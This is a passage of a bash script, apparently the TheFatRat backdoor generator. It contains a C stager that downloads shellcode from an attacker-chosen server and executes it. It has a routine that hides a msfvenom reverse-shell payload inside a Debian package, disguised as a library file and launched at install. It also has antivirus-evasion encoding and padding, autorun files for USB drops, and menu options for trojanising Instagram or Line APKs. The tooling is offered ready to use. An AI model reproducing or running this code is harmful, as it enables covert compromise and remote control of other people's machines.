	echo '    while (tret < len) {'>>$dllcustom
	echo '        nret = recv(my_socket, (char *)startb, len - tret, 0);'>> $dllcustom
	echo '        startb += nret;'>> $dllcustom
	echo '        tret   += nret;'>> $dllcustom
	echo '         if (nret == SOCKET_ERROR)'>> $dllcustom
	echo '            punt(my_socket, "no data");'>> $dllcustom
	echo '    }'>> $dllcustom
	echo '    return tret;'>> $dllcustom
	echo '}' >> $dllcustom
	echo 'SOCKET wsconnect(char * targetip, int port) {'>> $dllcustom
	echo '    struct hostent *        target;' >> $dllcustom
	echo '    struct sockaddr_in     sock;' >> $dllcustom
	echo '    SOCKET             my_socket;'>> $dllcustom
	echo '    my_socket = socket(AF_INET, SOCK_STREAM, 0);'>> $dllcustom
	echo '     if (my_socket == INVALID_SOCKET)'>> $dllcustom
	echo '        punt(my_socket, ".");'>> $dllcustom
	echo '    target = gethostbyname(targetip);'>> $dllcustom
	echo '    if (target == NULL)'>> $dllcustom
	echo '        punt(my_socket, "..");'>> $dllcustom
	echo '    memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);'>> $dllcustom
	echo '    sock.sin_family = AF_INET;'>> $dllcustom
	echo '    sock.sin_port = htons(port);'>> $dllcustom
	echo '    if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )'>> $dllcustom
	echo '         punt(my_socket, "...");'>> $dllcustom
	echo '    return my_socket;'>> $dllcustom
	echo '}' >> $dllcustom
	echo 'int main(int argc, char * argv[]) {' >> $dllcustom
	echo '  FreeConsole();'>> $dllcustom
	echo '    ULONG32 size;'>> $dllcustom
	echo '    char * buffer;'>> $dllcustom
	echo '    void (*function)();'>> $dllcustom
	echo '    winsock_init();'>> $dllcustom
	echo '    SOCKET my_socket = wsconnect(server, atoi(serverp));'>> $dllcustom
	echo '    int count = recv(my_socket, (char *)&size, 4, 0);'>> $dllcustom
	echo '    if (count != 4 || size <= 0)'>> $dllcustom
	echo '        punt(my_socket, "error lenght\n");'>> $dllcustom
	echo '    buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);'>> $dllcustom
	echo '    if (buffer == NULL)'>> $dllcustom
	echo '        punt(my_socket, "error in buf\n");'>> $dllcustom
	echo '    buffer[0] = 0xBF;'>> $dllcustom
	echo '    memcpy(buffer + 1, &my_socket, 4);'>> $dllcustom
	echo '    count = recv_all(my_socket, buffer + 5, size);'>> $dllcustom
	echo '    function = (void (*)())buffer;'>> $dllcustom
	echo '    function();'>> $dllcustom
	echo '    return 0;'>> $dllcustom
	echo '}' >> $dllcustom
      $COMPILER $dllcustom -o output/$fira.dll -lws2_32 -shared
      echo
      strip output/$fira.dll
            rm $dllcustom
      echo -e $yellow " [+]"$okegreen" Compiling C to dll done , chek in output folder  ";tput sgr0
      echo -ne $yellow " Press Enter key to Contiune ..."
      read aw
      PwnWinds

;;
9)
		 				clear
						menu

;;
*)
			PwnWinds
;;
esac
}


function trodebi () {
#code write by screetsec
clear
echo -e  $okegreen""
echo "___________            ________        ___.   .__ ";
echo "\__    ___/______  ____\______ \   ____\_ |__ |__|";
echo "  |    |  \_  __ \/  _ \|    |  \_/ __ \| __ \|  |";
echo "  |    |   |  | \(  <_> )    \    \   ___/| \_\\  |";
echo "  |____|   |__|   \____/_______  /\___  >___  /__|";
echo -e "                               \/     \/    \/    \n";
echo -e "\tTroDebi  -  Trojan Debian Package For Remote Acces   ";
echo -e "\tVersion  -  1.0   "
echo -e "\tWrite by -  screetsec                                           \n\n       "
echo -e "   [desc] - Embed a Trojan Into Deb PKG + Run Post Install       "
  echo -e $okegreen""
        echo -e $yellow "  Your local IPV4 address is : ${lanip}"
        echo -e $yellow "  Your local IPV6 address is : ${lanip6}"
        echo -e $yellow "  Your public IP address is : ${publicip}"
        echo -e $yellow "  Your Hostname is : ${hostn}"
  if [ ! -f "$defcon" ]
  then
  yourip=""
  yourport=""
  fi
          echo -e $okegreen""
        if [ -z "$yourip" ]; then
      read -p '   Set LHOST IP: ' yourip
                              fi
                              echo -e $okegreen ""
                              if [ -z "$yourport" ]; then
                              read -p '   Set LPORT: ' yourport
                              fi
      echo ""
      echo -ne $okegreen "  Enter the base name for Backdoor (ipscan_3.5.1_i386) : " ;tput sgr0
      read fira
      invalid
  if [ $err == "1" ]
  then
  echo -n "Press [ENTER] key to return to menu ."
  read inp
  bae
  fi
  seldeb
  cp $exef tools/trodebi_temp/original/
  pldlnx
  spinlong
  #name=`ls | awk '{print $1}' | head -n 1 `
  echo
  echo
  gboor
  spinlong
  echo -e $yellow ""
  echo ;echo
  #$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -b "\x00" -f elf > tmp_metasp/$fira
  dpkg -x tools/trodebi_temp/original/*.deb tools/trodebi_temp/work/
  mkdir -p  tools/trodebi_temp/work/usr;mkdir -p  tools/trodebi_temp/work/usr/lib;mkdir -p  tools/trodebi_temp/work/usr/lib/libssll;mkdir -p mkdir -p  tools/trodebi_temp/work/usr/local; mkdir -p  tools/trodebi_temp/work/usr/local/lib
  msfvenom -p $payload LHOST=$yourip LPORT=$yourport -b "\x00" -f elf -o tools/trodebi_temp/evil/libssl1
  mv tools/trodebi_temp/evil/libssl1 tools/trodebi_temp/work/usr/lib/libssll/bash
  mkdir -p tools/trodebi_temp/work/DEBIAN
  cp tools/trodebi_temp/control/control tools/trodebi_temp/work/DEBIAN/control
  echo "#!/bin/sh" > tools/trodebi_temp/work/DEBIAN/postinst
  echo "" >> tools/trodebi_temp/work/DEBIAN/postinst
  echo "" >> tools/trodebi_temp/work/DEBIAN/postinst
  echo " sudo chmod 2755 /usr/lib/libssll/bash && /usr/lib/libssll/bash & " >> tools/trodebi_temp/work/DEBIAN/postinst
  chmod 755 tools/trodebi_temp/work/DEBIAN/postinst
  dpkg-deb --build tools/trodebi_temp/work
  mv tools/trodebi_temp/work.deb output/$fira.deb
  rm -rf tools/trodebi_temp/work/* >> /dev/null 2>&1
  rm -rf tools/trodebi_temp/evil/* >> /dev/null 2>&1
  rm -rf tools/trodebi_temp/original/* >> /dev/null 2>&1
  spinlong
  echo;echo
      echo -e $yellow " [+]"$okegreen" Compiling Embed into Debian Package  ";tput sgr0
      echo
      echo -ne $yellow " Press Enter key to Contiune ..."
      read aw
  clear
  menu
}

########################################### MENU AVOID ############################################################
#
#recoded AVOID ( AV0id - Metapsloit Payload Anti-Virus Evasion ) to next version - Screetsec ( Edo -maland )
#Released as open source by NCC Group Plc - http://www.nccgroup.com/
#Developed or original code by Daniel Compton, daniel dot compton at nccgroup dot com
#Removed Deprecated Commands in favor of MsfVenom by Jason Soto www.jsitech.com
#Credit to other A.V. scripts and research by Astr0baby, Vanish3r & Hasan aka inf0g33k , Screetsec
#
################################################################################################################
function avoid {
clear

# User options
PAYLOAD="windows/meterpreter/reverse_tcp" # The payload to use
MSFVENOM="$msfvenom" # Path to the msfvenom script
MSFCONSOLE="$msfconsole" # Path to the msfconsole script

#Checking
[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
resize -s 36 73 > /dev/null
clear
SERVICE=service;

#Checking Version
VERSION="2.1"


# spinner for Metasploit Generator
spinlong ()
{
    bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ "
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}


# spinner for random seed generator
spinlong2 ()
{
    bar=" 01100111001001001110111001101010101010110101001010111001010101010101010"
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}
clear

#MENU INTI
echo ""
echo -e $cyan"========================================================================"
echo -e $okegreen"          METASPLOIT SHELL A.V. FOR BYPASS AV THIS VERSION $VERSION  "
echo -e $cyan"========================================================================"
echo -e $red""
echo "	 									"
echo "   	                  ..:::::::::..		"
echo "   	               ..:::aad8888888baa:::..	"
echo "   	           .::::d:?88888888888?::8b::::.	"
echo "   	         .:::d8888:?88888888??a888888b:::.	"
echo "   	       .:::d8888888a8888888aa8888888888b:::.	"
echo "   	      ::::dP::::::::88888888888::::::::Yb::::	"
echo "   	     ::::dP:::::::::Y888888888P:::::::::Yb::::	"
echo "   	    ::::d8:::::::::::Y8888888P:::::::::::8b::::	"
echo "   	   .::::88::::::::::::Y88888P::::::::::::88::::.	"
echo "   	   :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::	"
echo "   	   :::::::Y88888888888P::|::Y88888888888P:::::::	"
echo "   	   ::::::::::::::::888:::|:::888::::::::::::::::	"
echo "   	    :::::::::::::::8888888888888b::::::::::::::	"
echo "   	    :::::::::::::::88888888888888::::::::::::::	"
echo "   	     :::::::::::::d88888888888888::::::::::::: 	"
echo "   	      ::::::::::::88::88::88:::88::::::::::::	"
echo "   	        ::::::::::88::88::88:::88::::::::::	"
echo "   	          ::::::::88::88::P::::88::::::::	"
echo "   	            ::::::88::88:::::::88::::::	"
echo "   	                :::::::::::::::::::	"
echo "   	                     ::::::::: 	"
echo ""
echo -e -$cyan	"                REMAKE:$red "Screetsec" $cyan( Edo -maland- ) "
echo -e "      OPEN SOURCE : $red "NCC Group Plc" $cyan( http://www.nccgroup.com ) "
echo -e "  DEVELOPED : $red Daniel Compton, daniel dot compton at nccgroup dot com "
echo -e $cyan"========================================================================"
echo -e $okegreen"          METASPLOIT SHELL A.V. FOR BYPASS AV THIS VERSION $VERSION  "
echo -e $cyan"========================================================================"
echo -e $cyan""
# Set Output filename
echo
echo -n -e "TYPE THE DESIRED OUTPUT FILENAME : $okegreen" ;
read OUTPUTNAME
echo ""
echo ""
echo -n -e $cyan"TYPE THE DESIRED LABEL FOR THE AUTORUN FILES : $okegreen" ;
read LABEL
echo ""

#Check for Metasploit
if [[ "$msfvenom" != "" || "$msfconsole" != "" ]]; then
    echo ""
else
    echo ""
    echo -e "\e[01;31m[!]\e[00m Unable to find the required Metasploit program, cant continue. Install and try again"
    echo -e "\e[01;31m[!]\e[00m If msfpayload, msfencode and msfcli are not in your PATH, edit this script options"
    echo ""
    exit 1
fi

# Random Msfencode encoding iterations
#ITER=`seq 5 10 |sort -R |sort -R | head -1`
ITER=`shuf -i 10-20 -n 1`
echo -e $okegreen""
echo -e $yellow "Your local IPV4 address is : $lanip"
echo -e $yellow "Your local IPV6 address is : $lanip6"
echo -e $yellow "Your public IP address is : $publicip"
echo -e $yellow "Your Hostname is : $hostn"
if [ ! -f "$defcon" ]
then
yourip=""
yourport=""
fi
echo -e $okegreen""
if [ -z "$yourip" ]; then
read -p '  Set LHOST IP: ' yourip
fi
echo -e $okegreen ""
if [ -z "$yourport" ]; then
read -p '  Set LPORT: ' yourport
fi
invalid1
if [ $err == "1" ]
then
echo -e $okegreen ""
echo -n "Press [ENTER] key to return to menu ."
read inp
avoid
fi
    echo ""
    echo ""
echo ""
echo -e "\e[01;32m[-]\e[00m Generating Metasploit payload, please wait..."
echo ""
spinlong
echo ""
#Payload creater
$MSFVENOM -p "$PAYLOAD" LHOST="$yourip" LPORT="$yourport" EXITFUNC=thread -f raw | $MSFVENOM -e x86/shikata_ga_nai -i $ITER -f raw 2>/dev/null | $MSFVENOM -e x86/jmp_call_additive -i $ITER -a x86 --platform linux -f raw 2>/dev/null | $MSFVENOM -e x86/call4_dword_xor -i $ITER -a x86 --platform win -f raw 2>/dev/null |  $MSFVENOM -e x86/shikata_ga_nai -i $ITER -a x86 --platform win -f c > $path/temp/msf.c 2>/dev/null
echo ""
echo ""


# ANOTHER MENU
clear
echo "						"
echo -e $cyan"=================================================================="
echo -e $okegreen"   __            _                                    _  __  "
echo "  / _|_   _  ___| | ___   _  ___  _   _ _ __ ___  ___| |/ _| "
echo " | |_| | | |/ __| |/ / | | |/ _ \| | | | '__/ __|/ _ \ | |_  "
echo " |  _| |_| | (__|   <| |_| | (_) | |_| | |  \__ \  __/ |  _| "
echo " |_|  \____|\___|_|\_\\___ |\___/ \____|_|  |___/\___|_|_|   "
echo "                      |___/                                 "
echo -e $cyan"=================================================================="
echo -e $red""
echo -e $okegreen"            ||||||||||||||	"
echo -e $red"           =              \       "
echo "           =               |	"
echo "          _=            ___/	"
echo -e "         / _\           ($okegreen"o"$red)\	"
echo "        | | \            _  \	"
echo "        | |/            (____)	"
echo "         \__/          /   |	"
echo "          /           /  ___)	"
echo -e "         /    \       \    _)                       $okegreen ) "
echo -e $red"        \      \           /       $okegreen  TheFatRat $okegreen     ( "
echo -e $red"      \/ \      \_________/   |\___________________ $okegreen ) "
echo -e $red"       \/ \      /            |     $okegreen"===="$red _______)__) "
echo -e "        \/ \    /           __/___  $okegreen"===="$red _/  "
echo -e "         \/ \  /           ($okegreen"O"$red ____)\\_(_/ "
echo -e "                          ($okegreen"O"$red _ ____) "
echo -e "                           ($okegreen"O"$red ____) "
echo ""
echo -e $cyan"================================================================= "
echo ""
echo -e $okegreen""
echo " 1. Normal [ 400K payload ]  - [ fast compile ]  "
echo ""
echo " 2. Stealth [ 1-2 MB payload ] - [ fast compile ] "
echo ""
echo " 3. Super Stealth - [ 10-20MB payload ] "
echo ""
echo " 4. Insane Stealth - [ 50MB payload ] "
echo ""
echo " 5. Desperate Stealth - [ 100MB payload ] "
echo ""
echo -ne $cyan "TYPE THE NUMBER IF YOU WANT :  " ;
read LEVEL
echo ""
if [ "$LEVEL" = "1" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Normal selected, please wait a few seconds"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 100000-500000 -n 1)
elif [ "$LEVEL" = "2" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Stealth selected, please wait a few seconds"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 1000000-5000000 -n 1)
elif [ "$LEVEL" = "3" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Super Stealth selected, please wait a few seconds"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 8000000-12000000 -n 1)
elif [ "$LEVEL" = "4" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Insane Stealth selected, please wait a few minutes"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 40000000-60000000 -n 1)
elif [ "$LEVEL" = "5" ]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m Desperate Stealth selected, please wait a few minutes"
    echo ""
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
    echo ""
    spinlong2
    SEED=$(shuf -i 100000000-200000000 -n 1)
else
    echo -e "\e[01;31m[!]\e[00m You didnt select a option, exiting"
    echo ""
    exit 1
fi

# build the c file ready for compile
echo ""
echo '#include <stdio.h>' >> $path/temp/build.c
echo 'unsigned char padding[]=' >> $path/temp/build.c
cat /dev/urandom | tr -dc _A-Z-a-z-0-9 | head -c$SEED > $path/temp/random
sed -i 's/$/"/' $path/temp/random
sed -i 's/^/"/' $path/temp/random
cat $path/temp/random >> $path/temp/build.c
echo  ';' >> $path/temp/build.c
echo 'char payload[] =' >> $path/temp/build.c
cat $path/temp/msf.c |grep -v "unsigned" >> $path/temp/build.c
echo 'char comment[512] = "";' >> $path/temp/build.c
echo 'int main(int argc, char **argv) {' >> $path/temp/build.c
echo  '	(*(void (*)()) payload)();' >> $path/temp/build.c
echo '	return(0);' >> $path/temp/build.c
echo '}' >> $path/temp/build.c

# gcc compile the exploit

ls icons/icon.res >/dev/null 2>&1
if [ $? -eq 0 ]; then
    $COMPILER -Wall -mwindows icons/icon.res $path/temp/build.c -o "$OUTPUTNAME"
else
    $COMPILER -Wall -mwindows $path/temp/build.c -o "$OUTPUTNAME"
fi

# check if file built correctly
LOCATED=`pwd`
ls "$OUTPUTNAME" >/dev/null 2>&1
if [ $? -eq 0 ]; then
    echo ""
    echo -e "\e[01;32m[+]\e[00m Your payload has been successfully created and is located here: \e[01;32m"$LOCATED"/"$OUTPUTNAME"\e[00m"
else
    echo ""
    echo -e "\e[01;31m[!]\e[00m Something went wrong trying to compile the executable, exiting"
    echo ""
    exit 1
fi

# create autorun files
mkdir autorun >/dev/null 2>&1
cp "$OUTPUTNAME" autorun/ >/dev/null 2>&1
cp icons/autorun.ico autorun/ >/dev/null 2>&1
echo "[autorun]" > autorun/autorun.inf
echo "open="$OUTPUTNAME"" >> autorun/autorun.inf
echo "icon=autorun.ico" >> autorun/autorun.inf
echo "label="$LABEL"" >> autorun/autorun.inf
echo ""
echo -e "\e[01;32m[+]\e[00m I have also created 3 AutoRun files here: \e[01;32m"$LOCATED"/"autorun/"\e[00m - simply copy these files to a CD or USB"

# clean up temp files
rm -f $path/temp/* >/dev/null 2>&1
echo ""
echo -n -e $okegreen"Press [ENTER] key to return to menu"
		read back
clear
	menu
}


#### credits
function credits {
clear
echo -e "
\033[31m##########################################################################\033[m
		             Credits To
\033[31m##########################################################################\033[m"
echo
echo -e $white "Special thanks to:"
echo
echo -e $red "Dracos Linux ( www.dracos-linux.org )"
echo
echo -e $red "Offensive Security for the awesome OS"
echo
echo -e $green "http://www.offensive-security.com/"
echo
echo -e $yellow "http://www.kali.org/"
echo
echo -e $cyan "http://www.kitploit.com/"
echo
echo -e $white "http://www.linuxsec.org/"
echo
echo -e $red "Dana James Traversie - (backdoor-apk)"
echo
echo -e $cyan "z0noxz - (powerstager)"
echo
echo -e $white "peterpt"
echo
echo -e $red "Big Thanks to : http://www.github.com/"
echo
echo ""
echo -n -e $okegreen "Press [ENTER] key to return to menu"
		read back
clear
	menu

}

###################################################################
# MENU FATRAT
###################################################################
menu () {
  clear
  clear
  resize -s 46 76 > /dev/null
  echo -e $okegreen""
  echo -e $okegreen"         ____							"
  echo -e $okegreen"        |    | 							"
  echo -e $okegreen"        |____| 							"
  echo -e $okegreen"       _|____|_      $okegreen _____ _       _____     _   _____     _       "
  echo -e $okegreen"        /  $white"ee"\_      $okegreen|_   _| |_ ___|   __|___| |_| __  |___| |_     "
  echo -e $okegreen"      .<     __O     $okegreen  | | |   | -_|   __| .'|  _|    -| .'|  _|	"
  echo -e $okegreen"     /\ \.-.' \      $okegreen  |_| |_|_|___|__|  |___|_| |__|__|___|_|  	"
  echo -e $okegreen"    J  \.|'.\/ \                  				"
  echo -e $okegreen"    | |_.|. | | |   $white"[$okegreen--$white] $cyan " $white"Backdoor" Creator for Remote Acces $white[$okegreen--$white] 	"
  echo -e $okegreen"     \__.' .|-' /   $white"[$okegreen--$white] $cyan" Created by: "$red"Edo Maland (Screetsec) $white[$okegreen--$white]	"
  echo -e $okegreen"     L   /|o'--'\   $white"[$okegreen--$white] $cyan"           Version: $red"$Versi"           $white[$okegreen--$white]	"
  echo -e $okegreen"     |  /\/\/\   \  $white"[$okegreen--$white] $cyan"         Codename: $red"$codename"          $white[$okegreen--$white]    "
  echo -e $okegreen"     J /      \.__\ $white"[$okegreen--$white] $cyan"  Follow me on Github: $red@Screetsec   $white[$okegreen--$white]	"
  echo -e $okegreen"     J /      \.__\ $white"[$okegreen--$white] $cyan"  Dracos Linux : $red@dracos-linux.org  $white[$okegreen--$white]	"
  echo -e $okegreen"     |/         /   $white"[$okegreen--$white] $cyan"   				     $white[$okegreen--$white]		"
  echo -e $okegreen"       \      .'\.  $white"[$okegreen--$white]$white "    SELECT AN OPTION TO BEGIN:      $white[$okegreen--$white]  "
  echo -e $okegreen"    ____)_/\_(___\. $white"[$okegreen--$white] ".___________________________________$white[$okegreen--$white]	"
  echo -e $okegreen"   (___._/  \_.___)'$white\_.-----------------------------------------/	"
  echo


      echo -e $white " "
      echo -e $white"	[$okegreen"01"$white]$okegreen  Create Backdoor with msfvenom"
      echo -e $white"	[$okegreen"02"$white]$okegreen  Create Fud 100% Backdoor with Fudwin 1.0"
      echo -e $white"	[$okegreen"03"$white]$okegreen  Create Fud Backdoor with Avoid v1.2  "
      echo -e $white"	[$okegreen"04"$white]$okegreen  Create Fud Backdoor with backdoor-factory [embed] "
      echo -e $white"	[$okegreen"05"$white]$okegreen  Backdooring Original apk [Instagram, Line,etc] "
      echo -e $white"	[$okegreen"06"$white]$okegreen  Create Fud Backdoor 1000% with PwnWinds [Excelent] "
      echo -e $white"	[$okegreen"07"$white]$okegreen  Create Backdoor For Office with Microsploit "
      echo -e $white"	[$okegreen"08"$white]$okegreen  Trojan Debian Package For Remote Acces [Trodebi] "
      echo -e $white"	[$okegreen"09"$white]$okegreen  Load/Create auto listeners  "
      echo -e $white"	[$okegreen"10"$white]$okegreen  Jump to msfconsole  "
      echo -e $white"	[$okegreen"11"$white]$okegreen  Searchsploit  "
      echo -e $white"	[$okegreen"12"$white]$okegreen  File Pumper [Increase Your Files Size] "
      echo -e $white"	[$okegreen"13"$white]$okegreen  Configure Default Lhost & Lport "
      echo -e $white"	[$okegreen"14"$white]$okegreen  Cleanup  "
      echo -e $white"	[$okegreen"15"$white]$okegreen  Help  "
      echo -e $white"	[$okegreen"16"$white]$okegreen  Credits  "
      echo -e $white"	[$okegreen"17"$white]$okegreen  Exit  "
      echo -e " "
      echo -e $okegreen" ┌─["$red"TheFatRat$okegreen]──[$red~$okegreen]─["$yellow"menu$okegreen]:"
      echo -ne $okegreen" └─────► " ;tput sgr0
      read fatrat

      if test $fatrat == '1'
        then
        cmsfvenom

      elif test $fatrat == '2'
        then
        fudwin

      elif test $fatrat == '3'
        then
        avoid

      elif test $fatrat == '4'
        then
            echo ""
    	  spinlong
            echo -e "\n"
            echo -e $okegreen""
            echo -e $yellow "  Your local IPV4 address is : $lanip"
            echo -e $yellow "  Your local IPV6 address is : $lanip6"
            echo -e $yellow "  Your public IP address is : $publicip"
            echo -e $yellow "  Your Hostname is : $hostn"
            echo -e $okegreen""
        if [ ! -f "$defcon" ]
        then
            yourip=""
            yourport=""
        fi
            if [ -z "$yourip" ]; then
  				  read -p '  Set LHOST IP: ' yourip
            fi
            echo -e $okegreen ""
            if [ -z "$yourport" ]; then
            read -p '  Set LPORT: ' yourport
            fi
            read -p '  Please enter the base name for output files : ' fira
            invalid
            if [ $err == "1" ]
            then
              echo -e $okegreen ""
              echo -n "Press [ENTER] key to return to menu ."
              read inp
              menu
            fi
            			selexe
       	  			pldbkf
            			echo ""
    				gboor
    				spinlong2
    				echo ""
    				echo -e $okegreen""
    				$backdoor -f $exef -s $payload -H $yourip -P $yourport -o output/$fira.exe
  backout="$path/backdoored/output/$fira.exe"
   if [ ! -f "$backout" ]
  then
  echo -e $red "There was a problem in the creation of your backdoor file using backdoor-factory"
  echo -e $red "One of the problable causes is that the EXE file you selected is not yet supported"
  echo ""
  echo -e $okegreen "Press [ENTER] key to continue to main menu "
  read mmenu
  clear
  menu
  else
  echo ""
  echo -e $cyan "Your Rat was saved To :"
  echo -e $cyan "$path/backdoored/output/$fira.exe"
  echo ""
  bkflst
    				read bebeku
    				clear
    				menu

  fi
      elif test $fatrat == '5'
        then
        embedapk

      elif test $fatrat == '6'
        then
        PwnWinds

      elif test $fatrat == '7'
        then
        microsploit

      elif test $fatrat == '8'
        then
        trodebi

      elif test $fatrat == '9'
        then
        clisteners

      elif test $fatrat == '10'
        then
        xterm -fa monaco -fs 13 -bg black -e "$msfconsole"
       clear
  	menu

  elif test $fatrat == '11'
        then
        echo
        echo -ne $okegreen " What do you want to Hack Today ? :" ;tput sgr0
        read searchterm
        echo
        gnome-terminal --maximize -t "Seachsploit" --working-directory=WORK_DIR -x bash -c "$searchsploit $searchterm; echo -e '\e[32m[-] Close this window when done!\e[0m'; bash" 2>/dev/null & sleep 2
        menu

      elif test $fatrat == '12'
        then
        echo
        echo -ne $okegreen " Located file (example:/output/backdoor.exe) :" ;tput sgr0
        read tampfile
        echo
        echo -ne $okegreen"  Size file for tamper (1000 for kb) (1 for mb ) : " ;tput sgr0
        read size
        echo
        echo -ne $okegreen"  mb or kb : " ;tput sgr0
        read type
        python $pump $tampfile $size -$type > /dev/null 2>&1
        echo
        echo -ne $yellow"  Finished Pumping ... "
        read oke
        menu

      elif test $fatrat == '13'
        then
        echo ""
        confdefault
        clear
        menu

      elif test $fatrat == '14'
        then
        echo ""
        echo -ne $red"  [>] $cyan Are you sure you want to clean payload folders? [y/N] : "
        read clean
        if [ $clean == "y" ] ;
          then
        echo ""
          else
        clear
        menu
          fi
        echo -e $red"  [*] $cyan Cleaning $path/temp/"
        rm $path/temp/* >/dev/null 2>&1
        sleep 2
        echo ""
        echo -e $red"  [*] $cyan Cleaning $path/autorun/"
        rm $path/autorun/* >/dev/null 2>&1
        sleep 2
        echo ""
        echo -e $red"  [*] $cyan Cleaning $path/output/"
        rm $path/output/* >/dev/null 2>&1
        sleep 2
        echo ""
        echo -e $red"  [*] $cyan Cleaning $path/config/listeners/"
        rm $path/config/listeners/* >/dev/null 2>&1
        sleep 2
        echo ""
        echo -e $red"  [*] $cyan Cleaning $path/*.exe or apk"
        rm *.exe *.apk  >/dev/null 2>&1
        sleep 2
        echo ""
        echo -e $red"  [*] $cyan Cleaning $path/backdoored/output/"
        rm $path/backdoored/output/* >/dev/null 2>&1
        echo ""
        echo -ne $red"  [*] $cyan Folders cleaned, press [ENTER] key to return to the main menu."
        read anjeng
        menu

      elif test $fatrat == '15'
        then
        firefox https://github.com/Screetsec/TheFatRat/blob/master/README.md
        clear
       	menu

      elif test $fatrat == '16'
        then
        credits

      elif test $fatrat == '17'
        then
          Stop
          echo ""
          echo -e $okegreen"  REMEMBER , DONT UPLOAD TO VIRUSTOTAL !!"
          echo ""
          read -p "  Press [Enter] key to Exit..."
          sleep 2
          clear
          exit
      else
        clear
            menu

  fi

}
###################################################################
# MENU FATRAT
###################################################################
clear
clear
resize -s 46 76 > /dev/null
echo -e $okegreen""
echo -e $okegreen"         ____							"
echo -e $okegreen"        |    | 							"
echo -e $okegreen"        |____| 							"
echo -e $okegreen"       _|____|_      $okegreen _____ _       _____     _   _____     _       "
echo -e $okegreen"        /  $white"ee"\_      $okegreen|_   _| |_ ___|   __|___| |_| __  |___| |_     "
echo -e $okegreen"      .<     __O     $okegreen  | | |   | -_|   __| .'|  _|    -| .'|  _|	"
echo -e $okegreen"     /\ \.-.' \      $okegreen  |_| |_|_|___|__|  |___|_| |__|__|___|_|  	"
echo -e $okegreen"    J  \.|'.\/ \                  				"
echo -e $okegreen"    | |_.|. | | |   $white"[$okegreen--$white] $cyan " $white"Backdoor" Creator for Remote Acces $white[$okegreen--$white] 	"
echo -e $okegreen"     \__.' .|-' /   $white"[$okegreen--$white] $cyan" Created by: "$red"Edo Maland (Screetsec) $white[$okegreen--$white]	"
echo -e $okegreen"     L   /|o'--'\   $white"[$okegreen--$white] $cyan"           Version: $red"$Versi"           $white[$okegreen--$white]	"
echo -e $okegreen"     |  /\/\/\   \  $white"[$okegreen--$white] $cyan"         Codename: $red"$codename"          $white[$okegreen--$white]    "
echo -e $okegreen"     J /      \.__\ $white"[$okegreen--$white] $cyan"  Follow me on Github: $red@Screetsec   $white[$okegreen--$white]	"
echo -e $okegreen"     J /      \.__\ $white"[$okegreen--$white] $cyan"  Dracos Linux : $red@dracos-linux.org  $white[$okegreen--$white]	"
echo -e $okegreen"     |/         /   $white"[$okegreen--$white] $cyan"   				     $white[$okegreen--$white]		"
echo -e $okegreen"       \      .'\.  $white"[$okegreen--$white]$white "    SELECT AN OPTION TO BEGIN:      $white[$okegreen--$white]  "
echo -e $okegreen"    ____)_/\_(___\. $white"[$okegreen--$white] ".___________________________________$white[$okegreen--$white]	"
echo -e $okegreen"   (___._/  \_.___)'$white\_.-----------------------------------------/	"
echo


    echo -e $white " "
    echo -e $white"	[$okegreen"01"$white]$okegreen  Create Backdoor with msfvenom"
    echo -e $white"	[$okegreen"02"$white]$okegreen  Create Fud 100% Backdoor with Fudwin 1.0"
    echo -e $white"	[$okegreen"03"$white]$okegreen  Create Fud Backdoor with Avoid v1.2  "
    echo -e $white"	[$okegreen"04"$white]$okegreen  Create Fud Backdoor with backdoor-factory [embed] "
    echo -e $white"	[$okegreen"05"$white]$okegreen  Backdooring Original apk [Instagram, Line,etc] "
    echo -e $white"	[$okegreen"06"$white]$okegreen  Create Fud Backdoor 1000% with PwnWinds [Excelent] "
    echo -e $white"	[$okegreen"07"$white]$okegreen  Create Backdoor For Office with Microsploit "
    echo -e $white"	[$okegreen"08"$white]$okegreen  Trojan Debian Package For Remote Acces [Trodebi] "
    echo -e $white"	[$okegreen"09"$white]$okegreen  Load/Create auto listeners  "
    echo -e $white"	[$okegreen"10"$white]$okegreen  Jump to msfconsole  "
    echo -e $white"	[$okegreen"11"$white]$okegreen  Searchsploit  "
    echo -e $white"	[$okegreen"12"$white]$okegreen  File Pumper [Increase Your Files Size] "
    echo -e $white"	[$okegreen"13"$white]$okegreen  Configure Default Lhost & Lport "
    echo -e $white"	[$okegreen"14"$white]$okegreen  Cleanup  "
    echo -e $white"	[$okegreen"15"$white]$okegreen  Help  "
    echo -e $white"	[$okegreen"16"$white]$okegreen  Credits  "
    echo -e $white"	[$okegreen"17"$white]$okegreen  Exit  "
    echo -e " "
    echo -e $okegreen" ┌─["$red"TheFatRat$okegreen]──[$red~$okegreen]─["$yellow"menu$okegreen]:"
    echo -ne $okegreen" └─────► " ;tput sgr0
    read fatrat

    if test $fatrat == '1'
      then
      cmsfvenom

    elif test $fatrat == '2'
      then
      fudwin

